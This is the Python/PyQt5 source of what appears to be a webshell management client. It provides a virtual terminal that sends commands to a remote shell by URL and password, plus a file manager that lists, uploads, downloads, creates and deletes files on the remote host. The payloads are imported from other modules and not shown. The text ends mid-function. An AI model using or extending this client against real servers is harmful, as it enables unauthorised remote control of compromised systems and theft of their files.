# -*- coding: utf-8 -*-
"""
@Time ： 2024-06-12 14:20
@Auth ： No2Cat
@File ：MainUI.py
@IDE ：PyCharm
@DESC：
"""
import os
import sys
import time
import threading
import queue
from PyQt5.QtWidgets import QApplication, QMainWindow, QPushButton, QLineEdit, QTextEdit, QVBoxLayout, QWidget, \
    QHBoxLayout, QTabWidget, QMenuBar, QAction, QLabel, QMessageBox, QComboBox, QTreeWidget, QTreeWidgetItem, \
    QTableWidget, QSplitter, QTableWidgetItem, QHeaderView, QAbstractItemView, QMenu, QFileDialog, QDialogButtonBox, \
    QDialog, QDesktopWidget
from PyQt5.QtGui import QFont, QTextCursor, QIcon
from PyQt5 import QtGui
from PyQt5.QtCore import Qt, QThread, pyqtSignal
import resources_rc
from Common.CommonUtils import *
from Common.GenerateHtml import generate_basic_info_html
from Payloads.CMD import CMD
from Payloads.RealCMDPayloads import RealCMD
from Payloads.FileManagePayloads import FileManage


def setIcon(obj):
    # 设置窗口图标
    icon = QtGui.QIcon()
    icon.addPixmap(QtGui.QPixmap(':img_res/cat_ico.svg'), QtGui.QIcon.Normal, QtGui.QIcon.Off)
    obj.setWindowIcon(icon)


def setFloderIcon(obj):
    icon = QtGui.QIcon()
    icon.addPixmap(QtGui.QPixmap('./GUI/folder.png'), QtGui.QIcon.Normal, QtGui.QIcon.Off)
    obj.setIcon(icon)


def getPayloadFileContent(action_name):
    """ 虚拟终端 """
    file_path = './Payloads/' + action_name + '.py'
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
        escaped_content = content
        return escaped_content
    except Exception as e:
        return f"Error reading or processing file: {e}"


class VirtualTerminal(QTextEdit):
    """ 虚拟终端UI和相关事件函数 """

    def __init__(self):
        super().__init__()
        self.stop_threads = False
        self.prompt_path = "/>"
        self.command_start_pos = 0
        self.prompt()
        self.queue = queue.Queue()

    def setMsfLabel(self, msgLabel):
        self.msgLabel = msgLabel

    def setBinPath(self, binPath):
        self.binPath = binPath

    def setTimeDelay(self, timeDelay):
        self.timeDelay = timeDelay

    def setShellInfo(self, shellInfo):
        self.url = shellInfo['url']
        self.password = shellInfo['password']
        self.os_info = shellInfo['os']

    def prompt(self):
        self.append(self.prompt_path)
        self.setCursorPosition()

    def setCursorPosition(self):
        """ 设置光标位置 """
        cursor = self.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.setTextCursor(cursor)
        self.command_start_pos = cursor.position()

    def keyPressEvent(self, event):
        """ 键盘事件 检查光标位置 """
        cursor = self.textCursor()
        if cursor.position() < self.command_start_pos:
            cursor.setPosition(self.command_start_pos)
            self.setTextCursor(cursor)

        if event.key() in (Qt.Key_Return, Qt.Key_Enter):
            cursor.setPosition(self.command_start_pos, QTextCursor.KeepAnchor)
            command = cursor.selectedText().strip()
            self.runCommand(command)
        elif event.key() == Qt.Key_Backspace:
            if cursor.position() > self.command_start_pos:
                super().keyPressEvent(event)
        else:
            super().keyPressEvent(event)

    def runCommand(self, command='', init=False):
        """ 命令执行 """
        if command.lower() == 'exit shell':
            QApplication.instance().quit()
            return
        try:
            if init:
                self.runner = CmdContent(self)
                self.runner.outputReady.connect(self.appendOutput)
                if self.os_info.lower() != 'windows':
                    self.runner.finished.connect(self.commandFinished)
                self.runner.start()
                return True
            payload = RealCMD['writeCommand']
            payload = payload.replace('$command$', command)
            json_data = basic_info(payload, self.url, self.password)
            if json_data is not None:
                if 'status' in json_data and json_data['status'] == 'success':
                    self.runner = CmdContent(self)
                    self.runner.outputReady.connect(self.appendOutput)
                    if self.os_info.lower() != 'windows':
                        self.runner.finished.connect(self.commandFinished)
                    self.runner.start()
                    return True
            pass
        except Exception as e:
            logger.error('[MainUI.VirtualTerminal.runCommand] ' + str(e))
            self.msgLabel.setText('[runCommand] ' + str(e))

    def appendOutput(self, output):
        self.append(output)
        self.setCursorPosition()

    def commandFinished(self):
        self.prompt()

    def getCmdContent(self):
        flag = True
        fail_count = 0
        while flag:
            output = ''
            try:
                payload = RealCMD['readTerminal']
                json_data = basic_info(payload, self.url, self.password)
                if json_data is not None:
                    if 'status' in json_data and json_data['status'] == 'success':
                        if json_data['msg'] == '':
                            if fail_count < 0:
                                flag = False
                                self.setCursorPosition()
                            fail_count -= 1
                        else:
                            output = json_data['msg']
            except Exception as e:
                logger.exception('[MainUI.VirtualTerminal.getCmdContent] ' + str(e))
                self.msgLabel.setText('异常' + str(e))
            if output != '':
                self.append(output)
            self.setCursorPosition()
            time.sleep(0.5)


class CmdContent(QThread):
    """ 防止操作UI控件的时候因为阻塞造成卡顿 """
    outputReady = pyqtSignal(str)

    def __init__(self, vt):
        super().__init__()
        self.vt = vt

    def run(self):
        flag = True
        fail_count = -1
        line_count = 0
        while flag:
            output = ''
            try:
                payload = RealCMD['readTerminal']
                json_data = basic_info(payload, self.vt.url, self.vt.password)
                if json_data is not None:
                    if 'status' in json_data and json_data['status'] == 'success':
                        if json_data['msg'] == '':
                            if fail_count < 0:
                                flag = False
                            fail_count -= 1
                        else:
                            output = json_data['msg']
                            line_count += 1
            except Exception as e:
                logger.exception('[MainUI.VirtualTerminal.getCmdContent] ' + str(e))
                self.vt.msgLabel.setText('异常' + str(e))

            if output != '':
                # if line_count == 1:  # 去掉提示符第一行
                #     output.replace(self.vt.prompt_path, '这是提示符》')
                if output[-2:] == '\r\n':
                    output = output[:-2]
                if output[-1] == '\n':
                    output = output[:-1]
                if output[-1] == '\r':
                    output = output[:-1]
                self.outputReady.emit(output)
            # self.vt.setCursorPosition()
            time.sleep(0.8)


class CreateFileDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)

        self.setWindowTitle("创建文件")
        self.setGeometry(100, 100, 400, 300)

        self.file_name_label = QLabel("文件名:")
        self.file_name_edit = QLineEdit()

        self.file_content_label = QLabel("文件内容:")
        self.file_content_edit = QTextEdit()

        self.button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        self.button_box.accepted.connect(self.accept)
        self.button_box.rejected.connect(self.reject)

        layout = QVBoxLayout()
        layout.addWidget(self.file_name_label)
        layout.addWidget(self.file_name_edit)
        layout.addWidget(self.file_content_label)
        layout.addWidget(self.file_content_edit)
        layout.addWidget(self.button_box)

        self.setLayout(layout)

        self.centerDialog()

    def centerDialog(self):
        # 获取屏幕的尺寸
        screen_rect = QDesktopWidget().availableGeometry()
        screen_center = screen_rect.center()
        # 获取对话框的尺寸
        dialog_rect = self.geometry()
        # 计算新的对话框位置
        dialog_rect.moveCenter(screen_center)
        # 移动对话框到新的位置
        self.move(dialog_rect.topLeft())


class CreateFolderDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)

        self.setWindowTitle("创建文件夹")
        self.setGeometry(100, 100, 200, 100)

        self.folder_name_label = QLabel("文件夹名:")
        self.folder_name_edit = QLineEdit()

        self.button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        self.button_box.accepted.connect(self.accept)
        self.button_box.rejected.connect(self.reject)

        layout = QVBoxLayout()
        layout.addWidget(self.folder_name_label)
        layout.addWidget(self.folder_name_edit)
        layout.addWidget(self.button_box)

        self.setLayout(layout)

        self.centerDialog()

    def centerDialog(self):
        # 获取屏幕的尺寸
        screen_rect = QDesktopWidget().availableGeometry()
        screen_center = screen_rect.center()

        # 获取对话框的尺寸
        dialog_rect = self.geometry()

        # 计算新的对话框位置
        dialog_rect.moveCenter(screen_center)

        # 移动对话框到新的位置
        self.move(dialog_rect.topLeft())


class FileTableWidget(QTableWidget):
    """主表格窗口"""

    def __init__(self, parent=None, data=None, logger=None, tree=None):
        super(FileTableWidget, self).__init__(parent)
        self.cols = [0, 2, 3, 4, 5, 6]  # 数据居中列
        self.data_map = {2: 'size', 3: 'created', 4: 'modified', 5: 'permissions'}
        self.data = data
        self.logger = logger
        self.tree = tree
        self.initUI()
        self.initData()
        self.event_func()
        self.child_icon = QIcon('./GUI/folder.png')
        self.root_icon = QIcon('./GUI/device.png')
        self.file_icon = QIcon('./GUI/unknown.png')

    def event_func(self):
        """槽函数"""
        self.horizontalHeader().sectionClicked.connect(self.table_from_slotHeaderClicked)  # 排序
        self.customContextMenuRequested.connect(self.showContextMenu)  # 右键菜单

    def table_from_slotHeaderClicked(self, logicalIndex):
        if logicalIndex == 0:  # 如果点击的是第一列
            return  # 不排序
        else:
            order = self.horizontalHeader().sortIndicatorOrder()
            self.sortItems(logicalIndex, order)

    def initUI(self):
        col_num = 8
        col_name = ['编号', '名称', '大小', '创建时间', '修改时间', '权限(读/写/执行)', '属性', '文件路径']
        self.setRowCount(0)  # 设置初始行数
        self.setColumnCount(col_num)  # 设置初始列数
        # 设置表头
        self.setHorizontalHeaderLabels(col_name)
        self.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        qssTV = '''
            # QTableWidget::item:hover{background-color:rgb(92,188,227,200)}"
            "QTableWidget::item:selected{background-color:#1B89A1}"
            "QHeaderView::section,QTableCornerButton:section{padding:3px; margin:0px; color:#DCDCDC; border:1px solid #242424; border-left-width:0px; border-right-width:1px; border-top-width:0px; border-bottom-width:1px; background:qlineargradient(spread:pad,x1:0,y1:0,x2:0,y2:1,stop:0 #646464,stop:1 #525252); }"
            "QTableWidget{background-color:white;border:none;}
            '''
        # 表格铺满
        self.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        # 禁止编辑
        self.setEditTriggers(QAbstractItemView.NoEditTriggers)
        # 选中整行
        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        # 选中颜色
        self.setStyleSheet("selection-background-color:darkblue;")
        # 设置表头字体加粗
        font = self.horizontalHeader().font()
        # font.setBold(True)
        font.setPointSize(10)  # 设置表头字号为10
        self.horizontalHeader().setFont(font)
        self.setStyleSheet(qssTV)
        # 隐藏默认竖向表头
        self.verticalHeader().setHidden(True)
        # 协调全选按钮与其他按钮事件的状态，避免冲突发生
        self.needCheckAll = True
        self.needCancelAll = True

        # 表头外框线
        self.horizontalHeader().setStyleSheet("color: rgb(0, 83, 128);border:1px solid rgb(210, 210, 210);")

        # 交替行颜色
        self.setAlternatingRowColors(True)

        # 不允许拖动选择行
        self.setSelectionMode(QTableWidget.SingleSelection)

        # 设置表格的上下文菜单策略为自定义
        self.setContextMenuPolicy(Qt.CustomContextMenu)

        # 隐藏指定列
        self.setColumnHidden(0, True)
        self.setColumnHidden(7, True)

    def showEvent(self, event):
        """显示事件"""
        # 数据居中
        for row in range(self.rowCount()):
            for col in self.cols:
                item = self.item(row, col)
                if item:
                    item.setTextAlignment(Qt.AlignCenter)
        # 在窗口显示时调整列宽度
        self.setColumnWidth(1, 250)
        # self.setColumnWidth(2, 80)
        # 设置其他列的列宽可手动调节
        self.horizontalHeader().setSectionResizeMode(1, QHeaderView.Interactive)
        # self.horizontalHeader().setSectionResizeMode(3, QHeaderView.Interactive)
        # self.horizontalHeader().setSectionResizeMode(4, QHeaderView.Interactive)

    def getPermissions(self, permissions):
        per = ''
        if permissions['readable']:
            per += 'R'
        if permissions['writable']:
            per += 'W'
        if permissions['writable']:
            per += 'E'
        return per

    def initData(self, trees=None):
        """ 初始化数据 """

        while self.rowCount() > 0:
            self.removeRow(0)
        if trees is not None:
            tree_data = trees['dir']
            tree_path = trees['node_path']
            # self.treeData = tree_data
            for i in range(len(tree_data)):
                data = tree_data[i]
                self.insertRow(i)
                item = QTableWidgetItem(str(data['name']))
                if data['is_directory']:
                    item.setIcon(self.child_icon)
                else:
                    item.setIcon(self.file_icon)
                self.setItem(i, 1, item)
                self.setItem(i, 2, QTableWidgetItem(str(data['size'])))
                self.setItem(i, 3, QTableWidgetItem(data['created']))
                self.setItem(i, 4, QTableWidgetItem(data['modified']))
                self.setItem(i, 5, QTableWidgetItem(self.getPermissions(data['permissions'])))
                self.setItem(i, 6, QTableWidgetItem('文件夹' if data['is_directory'] else '文件'))
                if self.tree.main_window.os_shell.lower() == 'windows':
                    self.setItem(i, 7, QTableWidgetItem(str(tree_path + str(data['name']) + "\\\\")))
                else:
                    self.setItem(i, 7, QTableWidgetItem(str(tree_path + str(data['name']) + "/")))
        # 数据居中
        for row in range(self.rowCount()):
            for col in self.cols:
                item = self.item(row, col)
                if item:
                    item.setTextAlignment(Qt.AlignCenter)

    def refreshData(self):
        """ 刷新数据 """
        # 删除数据
        while self.rowCount() > 0:
            self.removeRow(0)
        now_path = self.tree.filePathLineEdit.text()
        if self.tree.main_window.os_shell.lower() == 'windows':
            now_path = now_path.replace('\\', '\\\\')
            if now_path[-1] != '\\':
                now_path += '\\\\'
        else:
            if now_path[-1] != '/':
                now_path += '/'
        self.tree.on_item_clicked(item=None, column=None, node_path=now_path, flag=True)  # 复用函数
        # self.initData()
        for row in range(self.rowCount()):
            for col in self.cols:
                item = self.item(row, col)
                if item:
                    item.setTextAlignment(Qt.AlignCenter)

    def copyData(self, item):
        """复制数据到粘贴板"""
        # 获取点击的行号
        row = item.row()
        # 获取该行的内容
        row_data = []
        for column in range(self.columnCount()):
            row_data.append(self.item(row, column).text() if self.item(row, column) else "")
        # 获取系统剪贴板对象
        clipboard = QApplication.clipboard()
        # 将文本复制到剪贴板
        clipboard.setText(row_data[1])

    def delFileAction(self, row_data=None):
        reply = QMessageBox.critical(self, "提示", "确认删除吗？", QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
        if reply == QMessageBox.Yes:
            try:
                payload = FileManage['delete']
                if row_data[-2] == '文件':
                    if self.tree.main_window.os_shell.lower() == 'windows':
                        row_data[-1] = row_data[-1][:-2]
                    else:
                        row_data[-1] = row_data[-1][:-1]
                payload = payload.replace('$path$', row_data[-1])
                url = self.tree.main_window.url_input.text().strip()
                password = self.tree.main_window.password_input.text().strip()
                json_data = basic_info(payload=payload, url=url, password=password)
                if json_data is not None:
                    if 'status' in json_data and json_data['status'] == 'success':
                        self.tree.fileMsgLable.setText('[*] 删除成功')
                        self.refreshData()
            except Exception as e:
                logger.exception('[MainUI.FileTableWidget.delFileAction] ' + str(e))
                self.tree.fileMsgLable.setText('[*] 异常查看日志')
        else:
            pass

    def openFolder(self, row_data=None):
        folder_path = row_data[-1]
        self.tree.openDir(event=None, path=folder_path)  # 复用函数

    def save_file(self, file_name):
        # 设置默认文件名
        default_file_name = file_name
        # 打开文件保存对话框，只选择保存位置
        options = QFileDialog.Options()
        options |= QFileDialog.DontUseNativeDialog
        # file_path, _ = QFileDialog.getSaveFileName(self, "选择保存位置", default_file_name,
        #                                            "所有文件 (*)", options=options)
        # if file_path:
        #     # 提取保存路径，不包含文件名
        save_path = QFileDialog.getExistingDirectory(self, "选择保存位置", "")
        if save_path:
            full_path = f"{save_path}/{default_file_name}"
            return full_path

    def downloadFile(self, row_data=None):
        file_path = row_data[-1]
        try:
            payload = FileManage['download']
            if row_data[-2] == '文件':
                if self.tree.main_window.os_shell.lower() == 'windows':
                    row_data[-1] = row_data[-1][:-2]
                else:
                    row_data[-1] = row_data[-1][:-1]
            file_name = row_data[1]
            full_file_path = self.save_file(file_name)
            if full_file_path:
                url = self.tree.main_window.url_input.text().strip()
                password = self.tree.main_window.password_input.text().strip()
                flag = True
                file_id = ''
                all_chunks = []
                while flag:
                    rpayload = payload.replace('$path$', row_data[-1]).replace('$file_id$', file_id)
                    json_data = basic_info(payload=rpayload, url=url, password=password)
                    if json_data is not None:
                        if 'status' in json_data:
                            if json_data['status'] == 'continue':
                                file_id = json_data['file_id']
                                all_chunks.append(json_data['msg'])
                                self.tree.fileMsgLable.setText('[*] 下载中')
                            elif json_data['status'] == 'success':
                                flag = False
                                self.tree.fileMsgLable.setText('[*] 下载完成')
                for chunk in all_chunks:
                    chunk = base64.b64decode(chunk)
                    with open(full_file_path, 'ab+') as f:
                        f.write(chunk)
        except Exception as e:
            logger.exception('[MainUI.FileTableWidget.downloadFile] ' + str(e))
            self.tree.fileMsgLable.setText('[*] 异常查看日志')

    def read_file_as_binary(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                binary_data = file.read()
            return binary_data
        except FileNotFoundError as e:
            logger.exception('[MainUI.FileTableWidget.read_file_as_binary] ' + str(e))
            self.tree.fileMsgLable.setText(f"[*] The file {file_path} was not found.")
        except IOError as e:
            logger.exception('[MainUI.FileTableWidget.read_file_as_binary] ' + str(e))
            self.tree.fileMsgLable.setText(f"[*] An error occurred while reading the file {file_path}.")

    def split_and_encode_binary_data(self, binary_data, chunk_size=2 * 1024 * 1024):
        # 分割并编码二进制数据
        encoded_data_dict = {}
        total_size = len(binary_data)
        num_chunks = (total_size + chunk_size - 1) // chunk_size  # 计算分块数
        for i in range(num_chunks):
            chunk = binary_data[i * chunk_size: (i + 1) * chunk_size]
            encoded_chunk = base64.b64encode(chunk).decode('utf-8')
            encoded_data_dict[f'chunk_{i + 1}'] = encoded_chunk
        return encoded_data_dict

    def showFileDialog(self):
        options = QFileDialog.Options()
        options |= QFileDialog.ReadOnly
        fileName, _ = QFileDialog.getOpenFileName(self, "QFileDialog.getOpenFileName()", "",
                                                  "All Files (*)", options=options)
        if fileName:
            return fileName

    def uploadFile(self):
        """ 文件上传 """
        try:
            current_path = self.tree.filePathLineEdit.text().replace('\\', '\\\\')
            if self.tree.main_window.os_shell.lower() == 'windows':
                now_path = current_path.replace('\\', '\\\\')
                if now_path[-1] != '\\':
                    now_path += '\\\\'
            else:
                if current_path[-1] != '/':
                    current_path += '/'
            local_file_path = self.showFileDialog()
            if local_file_path is None:
                pass
            else:
                (path, filename) = os.path.split(local_file_path)
                remote_file_path = current_path + filename
                file_id = ''
                payload = FileManage['upload']
                url = self.tree.main_window.url_input.text().strip()
                password = self.tree.main_window.password_input.text().strip()
                # 读取文件
                binary_data = self.read_file_as_binary(local_file_path)
                if binary_data:
                    # 切割文件
                    encoded_data_dict = self.split_and_encode_binary_data(binary_data)
                    for key, value in encoded_data_dict.items():
                        self.tree.fileMsgLable.setText(f"[*] {key}: {len(value)} characters: ")
                        # 文件上传包
                        rpayload = payload.replace('$file_id$', file_id).replace('$content$', value).replace('$path$',
                                                                                                             remote_file_path)
                        json_data = basic_info(payload=rpayload, url=url, password=password)
                        if json_data is not None:
                            if 'status' in json_data and 'success' in json_data['status']:
                                file_id = json_data['file_id']
                                self.tree.fileMsgLable.setText(
                                    '[*] ' + str(json_data['status']) + ' - ' + str(json_data['msg']))
                            elif 'status' in json_data and 'error' in json_data['status']:
                                self.tree.fileMsgLable.setText('[*] 上传失败' + json_data['msg'])
                    # self.tree.fileMsgLable.setText('[*] 上传完成')
                self.refreshData()  # 刷新
        except Exception as e:
            logger.exception('[MainUI.FileTableWidget.uploadFile] ' + str(e))
            self.tree.fileMsgLable.setText('[*] 异常查看日志' + str(e))

    def createFolder(self):
        """ 创建文件夹 """
        try:
            current_path = self.tree.filePathLineEdit.text().replace('\\', '\\\\')
            if self.tree.main_window.os_shell.lower() == 'windows':
                now_path = current_path.replace('\\', '\\\\')
                if now_path[-1] != '\\':
                    now_path += '\\\\'
            else:
                if current_path[-1] != '/':
                    current_path += '/'
            dialog = CreateFolderDialog(self)
            if dialog.exec() == QDialog.Accepted:
                folder_name = dialog.folder_name_edit.text()
                folder_path = current_path + folder_name
                url = self.tree.main_window.url_input.text().strip()
                password = self.tree.main_window.password_input.text().strip()
                payload = FileManage['mkdir']
                payload = payload.replace('$path$', folder_path)
                json_data = basic_info(payload=payload, url=url, password=password)
                if 'status' in json_data and json_data['status'] == 'success':
                    QMessageBox.information(self, "创建成功", f"{folder_path}")
                self.refreshData()
        except Exception as e:
            logger.exception('[MainUI.FileTableWidget.createFile] ' + str(e))
            self.tree.fileMsgLable.setText('[*] 异常查看日志' + str(e))

    def createFile(self):
        try:
            current_path = self.tree.filePathLineEdit.text().replace('\\', '\\\\')
            if self.tree.main_window.os_shell.lower() == 'windows':
                now_path = current_path.replace('\\', '\\\\')
                if now_path[-1] != '\\':
                    now_path += '\\\\'
            else:
                if current_path[-1] != '/':
                    current_path += '/'
            dialog = CreateFileDialog(self)
            if dialog.exec() == QDialog.Accepted:
                file_name = dialog.file_name_edit.text()
                file_path = current_path + file_name
                file_content = dialog.file_content_edit.toPlainText()
                file_content = base64.b64encode(file_content.encode('utf-8')).decode('utf-8')
                url = self.tree.main_window.url_input.text().strip()
                password = self.tree.main_window.password_input.text().strip()
                payload = FileManage['touch']
                payload = payload.replace('$path$', file_path).replace('$content$', file_content).replace('$file_id$',
                                                                                                          '')
                json_data = basic_info(payload=payload, url=url, password=password)
                if 'status' in json_data and json_data['status'] == 'success':
                    QMessageBox.information(self, "创建成功", f"{file_name}")
                self.refreshData()
        except Exception as e:
            logger.exception('[MainUI.FileTableWidget.createFile] ' + str(e))
            self.tree.fileMsgLable.setText('[*] 异常查看日志' + str(e))

    def showContextMenu(self, position):
        """右键菜单"""
        item = self.itemAt(position)
        contextMenu = QMenu(self)
        # 设置菜单项字体
        font = QFont()
        font.setPointSize(9)  # 设置字体大小
        contextMenu.setFont(font)
        # 获取该行的内容
        row_data = []
        if item:
            # 获取点击的行号
            row = item.row()
            for column in range(self.columnCount()):
                row_data.append(self.item(row, column).text() if self.item(row, column) else "")
        else:
            pass
        if item:
            # 如果点击的是文件夹
            if row_data[-2] == '文件夹':
                openFolderBtn = contextMenu.addAction("打开目录")
                contextMenu.addSeparator()
        createFileBtn = contextMenu.addAction("创建文件")
        contextMenu.addSeparator()
        createFolderBtn = contextMenu.addAction("创建文件夹")
        contextMenu.addSeparator()
        uploadFileBtn = contextMenu.addAction("上传文件")
        contextMenu.addSeparator()
        if item:
            if row_data[-2] == '文件':
                downloadFileBtn = contextMenu.addAction("下载文件")
                contextMenu.addSeparator()
        if item:
            delBtn = contextMenu.addAction("删除")
            contextMenu.addSeparator()
            cpyBtn = contextMenu.addAction("复制名称")
            contextMenu.addSeparator()
        refresh = contextMenu.addAction("刷新")

        action = contextMenu.exec_(self.mapToGlobal(position))
        if item:
            if row_data[-2] == '文件夹':
                if action == openFolderBtn:
                    self.openFolder(row_data)
            if row_data[-2] == '文件':
                if action == downloadFileBtn:
                    self.downloadFile(row_data)
            if action == delBtn:
                self.delFileAction(row_data)
            elif action == cpyBtn:
                self.copyData(item)
        if action == createFileBtn:
            self.createFile()
        elif action == createFolderBtn:
            self.createFolder()
        elif action == uploadFileBtn:
            self.uploadFile()
        elif action == refresh:
            self.refreshData()


class TreeTableFileManage(QWidget):
    def __init__(self, parent=None, main_window=None):
        super(TreeTableFileManage, self).__init__(parent)
        self.initUI()
        self.main_window = main_window
        # 保存结构
        self.item_info = dict()

    def initUI(self):
        # 创建一个 QSplitter 用于分割树形控件和表格控件
        self.splitter = QSplitter(self)

        # 创建树形控件
        self.tree = QTreeWidget()
        self.tree.setHeaderLabels(["目录"])
        self.tree.itemDoubleClicked.connect(self.on_item_clicked)  # 连接节点点击信号到槽函数
        self.splitter.addWidget(self.tree)

        # 展开所有节点
        # self.tree.expandAll()
        filePathLayout = QHBoxLayout()
        self.filePathLabel = QLabel("路径:")
        self.filePathLabel.setFont(QFont("Arial", 10))
        self.filePathLineEdit = QLineEdit()
        self.filePathLineEdit.setPlaceholderText("文件路径")
        self.filePathLineEdit.setFixedHeight(30)
        self.filePathLineEdit.setFixedHeight(30)
        self.filePathLineEdit.setFont(QFont("Arial", 14))
        self.filePathLineEdit.setStyleSheet("""
                                    QLineEdit {
                                        border: 1px solid #3E3E3E;
                                        border-radius: 5px;
                                        padding: 5px;
                                        font-size: 18px; padding: 2px;
                                    }
                                    QLineEdit:focus {
                                        border-color: #0078D7;
                                    }
                                """)
        self.filePathButton = QPushButton("打开")
        self.filePathButton.setFont(QFont("Arial", 12))
        self.filePathButton.setFixedHeight(30)
        self.filePathButton.setStyleSheet("""
                                    QPushButton {
                                        background-color: #0078D7;
                                        color: white;
                                        padding: 5px 15px;
                                        border-radius: 5px;
                                        margin-left: 20px;
                                    }
                                    QPushButton:hover {
                                        background-color: #005BB5;
                                    }
                                    QPushButton:pressed {
                                        background-color: #003E8C;
                                    }
                                """)
        self.filePathButton.clicked.connect(self.openDir)
        filePathLayout.addWidget(self.filePathLabel)
        filePathLayout.addWidget(self.filePathLineEdit)
        filePathLayout.addWidget(self.filePathButton)

        # 创建表格控件
        self.tableWidget = QWidget()
        self.tableLayout = QVBoxLayout()
        self.tableWidget.setLayout(self.tableLayout)
        self.table = FileTableWidget(tree=self)
        self.fileMsgLable = QLabel()
        self.fileMsgLable.setText('MSG')
        self.tableLayout.addLayout(filePathLayout)
        self.tableLayout.addWidget(self.table)
        self.tableLayout.addWidget(self.fileMsgLable)

        self.splitter.addWidget(self.tableWidget)

        # 设置 QSplitter 比例
        self.splitter.setStretchFactor(0, 1)
        self.splitter.setStretchFactor(1, 3)
        self.splitter.setSizes([150, 600])

        # 创建一个 QVBoxLayout 并将 QSplitter 添加进去
        self.layout = QVBoxLayout(self)
        self.layout.addWidget(self.splitter)
        self.setLayout(self.layout)

    def setShell(self, data):
        self.url = data['url']
        self.password = data['password']

    def get_tree_structure(self):
        """ 获取目录层次结构 """

        def recurse(item):
            structure = {item.text(0): {}}
            for i in range(item.childCount()):
                structure[item.text(0)].update(recurse(item.child(i)))
            return structure

        tree_structure = {}
        root = self.tree.invisibleRootItem()
        for i in range(root.childCount()):
            tree_structure.update(recurse(root.child(i)))
        return tree_structure

    def add_tree_child(self, parent, child_name):
        child = QTreeWidgetItem(parent)
        child_icon = QIcon('./GUI/folder.png')
        child.setText(0, str(child_name))
        child.setIcon(0, child_icon)  # 设置图标
        return child

    def add_tree_root(self, root_name):
        root = QTreeWidgetItem(self.tree)
        root_icon = QIcon('./GUI/device.png')
        root.setText(0, str(root_name))
        root.setIcon(0, root_icon)  # 设置图标
        return root

    def get_node_hierarchy(self, item):
        """ 获取节点的层次结构 """
        hierarchy = []
        while item is not None:
            hierarchy.insert(0, item.text(0))
            item = item.parent()
        return hierarchy

    def node_path_to_tree_item(self, node_path):
        """ 将路径遍历为tree结构的节点 不存在就添加为节点 """
        if self.main_window.os_shell.lower() == 'windows':
            node_dict = node_path.split('\\\\')
            root = node_dict[0] + '\\\\'
            node_dict[0] = root
        else:
            node_dict = node_path.split('/')
            root = '/'
            node_dict[0] = root
        path = node_dict[0]
        for i in range(len(node_dict)):
            if i > 0 and node_dict[i] != '':
                parent_path = path
                if self.main_window.os_shell.lower() == 'windows':
                    path += node_dict[i] + '\\\\'
                else:
                    path += node_dict[i] + '/'
                if path in self.item_info:
                    pass
                else:
                    child = self.add_tree_child(parent=self.item_info[parent_path]['item'], child_name=node_dict[i])
                    self.item_info[path] = dict()
                    self.item_info[path]['item'] = child

    def openDir(self, event, path=''):
        if path == '':
            node_path = self.filePathLineEdit.text()
            if self.main_window.os_shell.lower() == 'windows':
                node_path = node_path.replace('\\', '\\\\')
                if node_path[-1] != '\\':
                    node_path += '\\\\'
            else:
                if node_path[-1] != '/':
                    node_path += '/'
        else:
            node_path = path

        if node_path in self.item_info and 'dir' in self.item_info[node_path]:
            item_dir = dict()
            item_dir['dir'] = self.item_info[node_path]['dir']
            item_dir['node_path'] = str(node_path)
            self.table.initData(item_dir)
        else:
            try:
                payload = FileManage['dir']
                payload = payload.replace('$path$', str(node_path))
                url = self.main_window.url_input.text().strip()
                password = self.main_window.password_input.text().strip()
                json_data = basic_info(payload=payload, url=url, password=password)
                if json_data is not None:
                    if 'status' in json_data and json_data['status'] == 'success':
                        directory_details = json_data['msg']
                        # 添加到item_info 建立表格和树形结构关系
                        self.node_path_to_tree_item(node_path)  # 将打开的文件夹路径添加到tree中
                        # 遍历当前的路径添加节点到tree中
                        if node_path not in self.item_info:
                            self.item_info[node_path] = dict()
                        self.item_info[node_path]['dir'] = directory_details  # 以节点路径作为键
                        for directory in directory_details:
                            if directory['is_directory']:
                                child = self.add_tree_child(parent=self.item_info[node_path]['item'],
                                                            child_name=directory['name'])
                                # 将子节点也添加到item_info中
                                if self.main_window.os_shell.lower() == 'windows':
                                    self.item_info[str(node_path + directory['name'] + '\\\\')] = dict()
                                    self.item_info[str(node_path + directory['name'] + '\\\\')]['item'] = child
                                else:
                                    self.item_info[str(node_path + directory['name'] + '/')] = dict()
                                    self.item_info[str(node_path + directory['name'] + '/')]['item'] = child
                        item_dir = dict()
                        item_dir['dir'] = self.item_info[node_path]['dir']
                        item_dir['node_path'] = str(node_path)
                        self.filePathLineEdit.setText(str(node_path.replace('\\\\', '\\')))
                        self.table.initData(item_dir)
                else:
                    self.fileMsgLable.setText('[*] 异常查看日志')
            except Exception as e:
                logger.exception('[MainUI.TreeTableFileManage.openDir] ' + str(e))
                self.fileMsgLable.setText('[*] 异常查看日志')

        # 定位到树形结构
        if 'item' in self.item_info[node_path]:
            # 递归收起所有节点
            self.collapse_all_nodes(self.tree.invisibleRootItem())  # 收起
            self.tree.expandItem(self.item_info[node_path]['item'])  # 展开
            self.tree.scrollToItem(self.item_info[node_path]['item'])  # 滚动

    def collapse_all_nodes(self, item):
        """递归收起所有节点"""
        for i in range(item.childCount()):
            child = item.child(i)
            self.tree.collapseItem(child)
            self.collapse_all_nodes(child)

    def delete_all_children(self, current_item):
        """删除当前节点的所有子节点"""
        if current_item:
            while current_item.childCount() > 0:
                current_item.takeChild(0)

    def on_item_clicked(self, item, column, node_path='', flag=False):
        """ 双击节点事件: 获取节点下的目录信息 """
        if node_path == '':
            node_hierarchy = self.get_node_hierarchy(item)
            root_path = node_hierarchy[0]
            node_path = root_path
            if self.main_window.os_shell.lower() == 'windows':
                node_path = node_path[:-1] + '\\\\'  # 获取盘符
                for node in node_hierarchy[1:]:
                    node_path += node + '\\\\'
            else:
                for node in node_hierarchy[1:]:
                    node_path += node + '/'
        # 判断该节点下是否存在子节点 并且将该点击事件函数作为了刷新的事件函数
        # if item.childCount() > 0:
